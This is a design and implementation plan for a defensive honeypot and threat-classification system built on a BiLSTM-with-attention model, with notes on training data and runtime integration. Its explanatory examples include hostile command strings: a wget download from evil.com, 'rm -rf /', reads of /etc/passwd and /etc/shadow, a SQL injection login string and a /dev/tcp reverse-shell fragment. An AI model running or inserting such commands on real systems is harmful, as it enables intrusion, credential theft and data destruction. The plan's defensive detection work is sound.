# AdaptiveShield Implementation Plan — Complete Self-Contained Guide

**Project**: AdaptiveShield — Multi-Agent Cyber Deception Platform  
**Branch**: `train` (base)  
**Target**: Unified neural model replacing 3-stage pipeline (Regex → Neural → MITRE fallback)  
**Runtime**: Docker Compose, CPU-only inference, RTX 3050 (5GB) for training  
**LLM**: `qwen2.5-coder:7b-instruct-q4_K_M` via Ollama at `http://192.168.56.1:11434`

---

## Executive Summary

Replace the current 3-stage classification pipeline with a **single unified neural model** that fuses:
1. **Command sequence** (BiLSTM with Attention, 256-dim output)
2. **MITRE tactics** (21-dim, real-time regex annotator)
3. **System changes** (~20-dim, decoy observation encoder)
4. **Binary triage** (70-dim: 12 static + 23 Ghidra + 25 Angr + 10 derived)

**Key Insight — Binary Feature Learning**: During training, the 181 real honeypot sessions that have full Ghidra/Angr analysis teach the TriageEncoder the correlation between quick static features (entropy, file size, packing) and deep binary analysis (CFG complexity, syscalls, crypto patterns). At runtime, only the fast static analyser runs (<100ms), but the TriageEncoder has already learned what those static signals *imply* about the deeper structure, because it saw them together during training.

**Action Policy**: Only brute-force → nftables block. All other threats → decoy redirect (engage & learn).

---

## Why BiLSTM? Architecture Comparison

Our command data consists of character-level sequences of bash commands and HTTP requests. Here is why we chose BiLSTM over alternatives:

### Normal Feed-Forward Neural Network (MLP)
- Treats input as a fixed-size flat vector — **no notion of sequence order**
- Would require flattening `cat /etc/passwd; wget evil.com/rat` into a bag-of-characters
- Loses all sequential context: can't distinguish `cat` (harmless) from `cat /etc/shadow` (credential access)
- **Verdict**: Unusable for variable-length command sequences

### Unidirectional LSTM
- Processes characters **left-to-right only**
- Understands that `wget` followed by `chmod +x` is suspicious
- But: when it sees `chmod +x`, it doesn't know what comes *after* (e.g., `./payload` vs `./setup.sh`)
- The final hidden state only captures left-context
- **Verdict**: Works, but loses backward context that helps disambiguate intent

### BiLSTM (What We Use)
- Two LSTMs: one reads **left→right**, one reads **right→left**
- At every character position, the model knows both what came *before* and what comes *after*
- When it sees `chmod +x` at position 50, the forward LSTM knows it followed `wget evil.com/rat`, and the backward LSTM knows it precedes `./rat; rm -rf /`
- Output: concatenation of both directions → 256-dim representation per timestep
- **Verdict**: Best for our use case — captures full bidirectional command context

### BiLSTM + Attention (What We Actually Use)
Standard BiLSTM uses only the final hidden state, which compresses the entire sequence into one vector — losing detail from early commands. Our attention mechanism ([model.py L77-83](file:///home/me/data/AdaptiveShield/src/training/neural/model.py#L77-L83)) adds a learned weighting over ALL timesteps:

```
attn_weights = softmax(Linear(Tanh(Linear(lstm_output))))  # [batch, seq_len, 1]
attended = sum(attn_weights * lstm_output, dim=1)           # [batch, 256]
```

This lets the model **focus on the most important characters/commands** in the sequence. For example, in a 2048-char session, the attention layer might assign high weight to the `POST /login.php?user=admin' OR 1=1--` portion and low weight to the `GET /favicon.ico` portion.

### Architecture Diagram

```
Input: "POST /login.php?user=admin' OR 1=1--; bash -i >& /dev/tcp/..."
  │
  ▼ Character-level tokenization (each char → ASCII index, max 2048)
  │
  ▼ CharacterEmbedding(256 vocab → 64-dim)
  │
  ▼ BiLSTM(2 layers, hidden=128, bidirectional → 256-dim per timestep)
  │
  ▼ Attention Pooling (learned weights over all timesteps → 256-dim)
  │
  ├── MitreEncoder(21 → 32)  ──┐
  ├── ChangeEncoder(20 → 32) ──┤
  ├── TriageEncoder(70 → 32) ──┤
  │                             ▼
  └───────── Concatenate: [256 + 32 + 32 + 32] = 384-dim
                                │
                                ▼ Fusion: Linear(384→128) → ReLU → Dropout → Linear(128→6)
                                │
                                ▼ Softmax → 6-class probability distribution
```

---

## Data Sources (All Complete)

### 1. `sessions_complete.csv` — 78,504 rows ✅
- **Source**: Real Cowrie/Dionaea honeypot sessions
- **Labels**: Safe (78,304), Destructive (127), ADVANCED_APT (49), Downloader (24)
- **Missing classes**: No Recon, No Exploit (these come from synthetic data)
- **Binary features**: 181 sessions have full real Ghidra/Angr analysis (all 70 triage columns populated)
- **Static triage**: 47,377 sessions have downloads with static triage (entropy, file size, etc.) but no deep analysis
- **MITRE**: Real annotations from `session_annotator.py`

### 2. `synthetic_batches.csv` — 10,387 rows ✅
- **Source**: LLM-generated blended HTTP+Bash sessions
- **Labels**: All 6 classes (Recon: 2,038, Safe: 2,010, Destructive: 2,000, Exploit: 1,999, ADVANCED_APT: 1,758, Downloader: 582)
- **Purpose**: Teach the model HTTP attack patterns (SQLi, XSS, path traversal) which the SSH honeypot never captured
- **Binary features**: All zeros (no real binaries) — correctly masked out during training
- **MITRE**: Computed by annotator with HTTP-aware regex patterns

### 3. `binary_features.csv` — 185 rows (reference only)
- Already merged into `sessions_complete.csv` via `download_shas`
- **Not loaded separately** — the real features are already in the session rows

---

## How Binary Feature Learning Works (Knowledge Transfer)

The key architectural insight: we have **three tiers** of binary knowledge in `sessions_complete.csv`:

| Tier | Sessions | What's Available | Triage Mask |
|------|----------|-----------------|-------------|
| **No binary** | ~31,000 | Commands + MITRE only | `True` (masked) |
| **Static only** | ~47,377 | Commands + MITRE + 12 static features (entropy, file size, packing, scores) | `False` (active) |
| **Full analysis** | 181 | Commands + MITRE + 12 static + 23 Ghidra + 25 Angr + 10 derived | `False` (active) |

During training, the `TriageEncoder(input_dim=70)` sees:
- **Tier 3 (181 sessions)**: All 70 features filled with real data. The encoder learns: "high entropy + is_packed + ghidra_has_aes_sbox + angr_has_crypto → likely ransomware". It learns the *joint distribution* of static and deep features.
- **Tier 2 (47K sessions)**: Only the first 12 features filled, rest are zero. The encoder still learns patterns from static features alone, but the weights it learned from Tier 3 inform how it interprets them.
- **Tier 1 (31K sessions)**: All zeros → `modality_mask = True` → triage encoder output is zeroed → model classifies using commands + MITRE only.

**At runtime**: Only `static_analyzer.py` runs (fast, <100ms). It fills the first 12 of the 70 triage features. The remaining 58 (Ghidra/Angr/derived) are zero. But the TriageEncoder has already learned from Tier 3 what those 12 static features *correlate with* in the deep analysis — so its 32-dim output still carries meaningful signal.

---

## Current State (as of 2026-09-24)

### ✅ Completed
1. **Ollama + Qwen model** — configured at `192.168.56.1:11434`
2. **Synthetic data generation** — 10,387 sessions in `synthetic_batches.csv`
3. **Core architecture**:
   - `model.py` — `UnifiedThreatClassifier` with 4-modality fusion (384-dim)
   - `dataset.py` — `ThreatDataset` with 70-dim triage, 2048 max_length, robust label_id handling
   - `trainer.py` — extracts and passes mitre, changes, triage, modality_mask
   - `train_neural.py` — training entry point, default max_length=2048
   - `decision.py` — runtime inference with 70-dim triage zeros
4. **MITRE annotator upgraded** — HTTP regex patterns (SQLi, XSS, scanners) added to `attack_mapping.py`
5. **Binary pipeline verified** — `feature_merger.py` correctly flattens Ghidra/Angr JSON → 70 columns in `sessions_complete.csv`

### ⬜ Not Started
6. Run neural training
7. Modify runtime interceptors
8. Modify decoy integration
9. Final integration test

---

## Execution Steps

### Step 5: Run Neural Training (NEXT)

```bash
PYTHONPATH=src python3 src/training/neural/train_neural.py \
    --data-path data/exports/sessions_complete.csv \
    --max-length 2048 \
    --batch-size 16 \
    --epochs 50 \
    --patience 5
```

**What happens**:
1. Loads `sessions_complete.csv` (78K real sessions with 4 classes)
2. Loads `synthetic_batches.csv` (10K synthetic with all 6 classes)
3. Concatenates, downsamples Safe to 5,000, shuffles
4. Splits into train/val/test (70/15/15)
5. For each sample, `ThreatDataset` builds:
   - `commands`: char indices, padded to batch max (up to 2048)
   - `mitre`: 21-dim real MITRE tactic vector
   - `changes`: 20-dim (zeros for real data, LLM-derived for synthetic)
   - `triage`: 70-dim (real binary features for 181 sessions, static-only for 47K, zeros for rest)
   - `modality_mask`: 4 booleans `[cmd_missing, mitre_missing, changes_missing, triage_missing]`
6. Trains `UnifiedThreatClassifier` with focal loss + class weights
7. Early stopping on validation loss (patience=5)
8. Saves `models/brain_v6_unified.pt`

**GPU Memory Note**: With `max_length=2048` and `batch_size=16`, the BiLSTM processes longer sequences. If OOM on RTX 3050 (5GB), reduce `--batch-size` to 8. The BiLSTM memory scales linearly with sequence length.

**Model Output Format** (consumed by `decision.py` → deception agent):

```python
# UnifiedThreatClassifier.predict() returns:
predictions: Tensor[batch]      # argmax class ids (0-5)
probabilities: Tensor[batch, 6] # softmax probability distribution

# decision.py wraps into:
{
    "class_id": int,           # 0-5
    "label": str,              # "Safe"|"Recon"|"Downloader"|"Exploit"|"Destructive"|"ADVANCED_APT"
    "confidence": float,       # max probability
    "action": str,             # "forward"|"forward_and_log"|"redirect_to_decoy"
    "rule": str,               # "neural_model (confidence=95.3%)" or MITRE rule
    "mitre_tactics": list,     # ["credential_access", "execution", ...]
    "severity_max": float,
    "neural_probs": dict,      # {"Safe": 0.02, "Recon": 0.05, ...}
}
```

### Step 6: Modify Runtime Interceptors

Files: `http_proxy.py`, `ssh_proxy.py`, `session_store.py`

1. **`http_proxy.py`**: Feed HTTP requests → unified model (commands + MITRE, triage masked). After binary download, run `static_analyzer.py` → fill 12 static triage features → re-classify with triage active.
2. **`ssh_proxy.py`**: Feed SSH commands → unified model. Update change vector after each command, re-run model. If binary downloaded, add static triage.
3. **`session_store.py`**: Add `binary_cache` + `system_changes` tables for progressive feature accumulation.

**Action mapping**:

| Label | Action | Deception Agent Behavior |
|-------|--------|--------------------------|
| Safe | `forward` | Pass to real service |
| Recon | `forward_and_log` | Pass but monitor |
| Downloader | `redirect_to_decoy` | Engage in decoy, watch downloads |
| Exploit | `redirect_to_decoy` | Present vulnerable surfaces |
| Destructive | `redirect_to_decoy` | Let them "destroy" fake data |
| ADVANCED_APT | `redirect_to_decoy` | Full engagement, track persistence |

> Old model used `drop_and_block` for Destructive/APT. New: ALL threats → decoy (only brute-force → block).

### Step 7: Modify Decoy Integration

Files: `ssh_decoy_builder.py`, `generator.py`, `orchestrator/main.py`

**Deception Agent uses the decision output**:
- `decision.get("label")` → base behavior template
- `decision.get("neural_probs")` → probability distribution for adaptive engagement
  - If APT probability rising → prepare persistence targets
  - If Destructive high → present expendable fake data
- `decision.get("mitre_tactics")` → craft contextual fake responses
- Re-classifies after each interaction → adapts in real-time

### Step 8: Final Integration Test

```bash
docker compose up -d --build
curl http://127.0.0.1/health
# Test: SQLi → decoy redirect (NOT blocked)
# Test: SSH brute-force (5 attempts) → nftables block
# Test: Exploit drops binary → static triage → classification updated
# Test: Repeated payload → cache hit → instant
```

---

## Key References

| Component | File |
|-----------|------|
| MITRE KB | `src/core/mitre/attack_mapping.py` |
| Session annotation | `src/core/mitre/session_annotator.py` |
| LLM Synthetic Generator | `src/training/neural/llm_synthetic.py` |
| LLM Client | `src/honeypot/llm_client.py` |
| LLM Router | `src/honeypot/router.py` |
| Unified Model | `src/training/neural/model.py` |
| 4-Modality Dataset | `src/training/neural/dataset.py` |
| Training Entry | `src/training/neural/train_neural.py` |
| Trainer Loop | `src/training/neural/trainer.py` |
| Decision Agent | `src/agents/decision.py` |
| Static Analyzer | `src/core/malware/static_analyzer.py` |
| Feature Merger | `src/core/malware/feature_merger.py` |
| Ghidra Extract | `src/core/malware/ghidra_extract.py` |
| Angr Symbolic | `src/core/malware/symbolic.py` |
| Change Encoder | `src/agents/change_encoder.py` |
| HTTP Guard | `src/interceptor/http_proxy.py` |
| SSH Guard | `src/interceptor/ssh_proxy.py` |
| SSH Decoy Builder | `src/honeypot/ssh_decoy_builder.py` |
| HTTP Decoy Generator | `src/honeypot/generator.py` |
| Orchestrator | `src/orchestrator/main.py` |

---

**End of Plan**